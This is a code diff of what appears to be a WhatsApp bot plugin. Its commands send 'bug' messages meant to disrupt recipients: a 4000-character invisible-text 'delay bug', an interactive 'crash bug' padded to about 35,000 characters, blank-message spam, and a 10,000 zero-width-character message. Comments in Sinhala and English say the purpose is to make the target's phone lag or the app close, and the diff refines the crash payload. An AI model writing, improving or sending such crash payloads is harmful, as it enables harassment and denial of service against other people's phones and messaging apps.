@@ -10,13 +10,11 @@ cmd({
 },
 async (conn, m, { from, reply }) => {
     try {
-        // DELAY BUG: Phone lag karanawa - Invisible chars 4000k
         let text = '';
         for(let i = 0; i < 4000; i++) text += 'ㅤ'; 
         await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐍𝐓' });
-        reply('✅ Delay bug sent');
     } catch (e) {
-        reply(`❌ Error: ${e}`);
+        reply(`❌ ${e.message}`);
     }
 });
 
@@ -30,18 +28,21 @@ cmd({
 },
 async (conn, m, { from, reply }) => {
     try {
-        // CRASH BUG: App close wenawa - 35k chars + interactive
+        // FIX: jidDecode nathi karala direct interactive yawanawa
         const crash = {
             interactiveMessage: {
-                header: { documentMessage: { url: "https://a" } },
-                body: { text: "x".repeat(35000) }, 
-                nativeFlowMessage: { buttons: [] }
+                body: { text: "𝐑𝐈𝐊𝐀-𝐂𝐑𝐀𝐒𝐇 ".repeat(2000) }, // 35k wage
+                nativeFlowMessage: { 
+                    buttons: [
+                        { name: "cta_url", buttonParamsJson: '{"display_text":"CLICK","url":"https://wa.me"}' }
+                    ]
+                }
             }
         };
-        await conn.relayMessage(from, crash, {});
+        await conn.relayMessage(from, crash, { messageId: m.key.id });
         reply('✅ Crash bug sent');
     } catch (e) {
-        reply(`❌ Error: ${e}`);
+        reply(`❌ ${e.message}`);
     }
 });
 
@@ -55,13 +56,12 @@ cmd({
 },
 async (conn, m, { from, reply }) => {
     try {
-        // GHOST BUG: Blank message spam 5k
         for(let i = 0; i < 5; i++) {
             await conn.sendMessage(from, { text: 'ㅤ' });
         }
         reply('✅ Ghost bug sent x5');
     } catch (e) {
-        reply(`❌ Error: ${e}`);
+        reply(`❌ ${e.message}`);
     }
 });
 
@@ -75,10 +75,9 @@ cmd({
 },
 async (conn, m, { from, reply }) => {
     try {
-        // INVISIBLE BUG: Chat eka kala - Zero width chars 10000k
         await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
         reply('✅ Invisible bug sent');
     } catch (e) {
-        reply(`❌ Error: ${e}`);
+        reply(`❌ ${e.message}`);
     }
 });
